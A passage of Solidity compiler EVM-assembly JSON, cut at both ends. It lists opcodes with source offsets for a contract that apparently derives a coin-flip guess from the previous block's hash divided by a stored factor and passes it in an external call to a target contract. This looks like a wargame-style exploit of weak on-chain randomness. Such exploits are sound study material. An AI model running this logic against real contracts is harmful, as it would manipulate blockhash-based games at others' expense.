											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 2432,
											"end": 2485,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 2432,
											"end": 2485,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 2432,
											"end": 2485,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2432,
											"end": 2485,
											"name": "tag",
											"source": 0,
											"value": "19"
										},
										{
											"begin": 2432,
											"end": 2485,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 2432,
											"end": 2485,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2432,
											"end": 2485,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2432,
											"end": 2485,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2358,
											"end": 2493,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2358,
											"end": 2493,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 2019,
											"end": 2117,
											"name": "tag",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 2019,
											"end": 2117,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 2060,
											"end": 2069,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 2072,
											"end": 2081,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "22"
										},
										{
											"begin": 2072,
											"end": 2079,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 2072,
											"end": 2081,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 2072,
											"end": 2081,
											"name": "tag",
											"source": 0,
											"value": "22"
										},
										{
											"begin": 2072,
											"end": 2081,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 2060,
											"end": 2081,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 2060,
											"end": 2081,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2098,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 2092,
											"end": 2098,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 2092,
											"end": 2098,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2098,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2098,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2098,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 2092,
											"end": 2098,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2098,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2098,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2098,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2092,
											"end": 2098,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2103,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2092,
											"end": 2103,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2103,
											"name": "PUSH",
											"source": 0,
											"value": "1D263F67"
										},
										{
											"begin": 2104,
											"end": 2108,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFF"
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "SHL",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "DUP8",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "EXTCODESIZE",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "tag",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "GAS",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "CALL",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "25"
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "RETURNDATACOPY",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "tag",
											"source": 0,
											"value": "25"
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "26"
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "tag",
											"source": 0,
											"value": "26"
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2092,
											"end": 2109,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2019,
											"end": 2117,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2019,
											"end": 2117,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 2203,
											"end": 2313,
											"name": "tag",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 2203,
											"end": 2313,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 2250,
											"end": 2259,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 2262,
											"end": 2271,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "28"
										},
										{
											"begin": 2262,
											"end": 2269,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 2262,
											"end": 2271,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 2262,
											"end": 2271,
											"name": "tag",
											"source": 0,
											"value": "28"
										},
										{
											"begin": 2262,
											"end": 2271,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 2250,
											"end": 2271,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 2250,
											"end": 2271,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2294,
											"name": "PUSH",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 2282,
											"end": 2294,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 2282,
											"end": 2294,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2294,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2294,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2294,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 2282,
											"end": 2294,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2294,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2294,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2294,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2282,
											"end": 2294,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2299,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2282,
											"end": 2299,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2299,
											"name": "PUSH",
											"source": 0,
											"value": "1D263F67"
										},
										{
											"begin": 2300,
											"end": 2304,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFF"
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "SHL",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "DUP8",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "EXTCODESIZE",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "29"
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "tag",
											"source": 0,
											"value": "29"
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "GAS",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "CALL",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "31"
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "RETURNDATACOPY",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "tag",
											"source": 0,
											"value": "31"
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "32"
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "tag",
											"source": 0,
											"value": "32"
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2282,
											"end": 2305,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2203,
											"end": 2313,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2203,
											"end": 2313,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 1696,
											"end": 1942,
											"name": "tag",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 1696,
											"end": 1942,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1732,
											"end": 1736,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1749,
											"end": 1767,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1788,
											"end": 1807,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "34"
										},
										{
											"begin": 1805,
											"end": 1806,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 1788,
											"end": 1800,
											"name": "NUMBER",
											"source": 0
										},
										{
											"begin": 1788,
											"end": 1804,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "35"
										},
										{
											"begin": 1788,
											"end": 1804,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1788,
											"end": 1807,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1788,
											"end": 1807,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1788,
											"end": 1807,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFF"
										},
										{
											"begin": 1788,
											"end": 1807,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 1788,
											"end": 1807,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 1788,
											"end": 1807,
											"name": "tag",
											"source": 0,
											"value": "34"
										},
										{
											"begin": 1788,
											"end": 1807,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1778,
											"end": 1808,
											"name": "BLOCKHASH",
											"source": 0
										},
										{
											"begin": 1770,
											"end": 1809,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1770,
											"end": 1809,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 1749,
											"end": 1809,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1749,
											"end": 1809,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1820,
											"end": 1836,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1839,
											"end": 1861,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "36"
										},
										{
											"begin": 1854,
											"end": 1860,
											"name": "PUSH",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 1854,
											"end": 1860,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 1839,
											"end": 1849,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 1839,
											"end": 1853,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "37"
										},
										{
											"begin": 1839,
											"end": 1853,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1839,
											"end": 1861,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1839,
											"end": 1861,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1839,
											"end": 1861,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFF"
										},
										{
											"begin": 1839,
											"end": 1861,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 1839,
											"end": 1861,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 1839,
											"end": 1861,
											"name": "tag",
											"source": 0,
											"value": "36"
										},
										{
											"begin": 1839,
											"end": 1861,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1820,
											"end": 1861,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1820,
											"end": 1861,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1872,
											"end": 1881,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1896,
											"end": 1897,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 1884,
											"end": 1892,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 1884,
											"end": 1897,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 1884,
											"end": 1912,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "38"
										},
										{
											"begin": 1884,
											"end": 1912,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 1907,
											"end": 1912,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1884,
											"end": 1912,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "39"
										},
										{
											"begin": 1884,
											"end": 1912,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 1884,
											"end": 1912,
											"name": "tag",
											"source": 0,
											"value": "38"
										},
										{
											"begin": 1884,
											"end": 1912,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1900,
											"end": 1904,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 1884,
											"end": 1912,
											"name": "tag",
											"source": 0,
											"value": "39"
										},
										{
											"begin": 1884,
											"end": 1912,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1872,
											"end": 1912,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1872,
											"end": 1912,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1930,
											"end": 1934,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1923,
											"end": 1934,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 1923,
											"end": 1934,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1923,
											"end": 1934,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1923,
											"end": 1934,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1923,
											"end": 1934,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1696,
											"end": 1942,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1696,
											"end": 1942,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 1274,
											"end": 1408,
											"name": "tag",
											"source": 1,
											"value": "35"
										},
										{
											"begin": 1274,
											"end": 1408,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1332,
											"end": 1339,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1358,
											"end": 1401,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "41"
										},
										{
											"begin": 1362,
											"end": 1363,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1365,
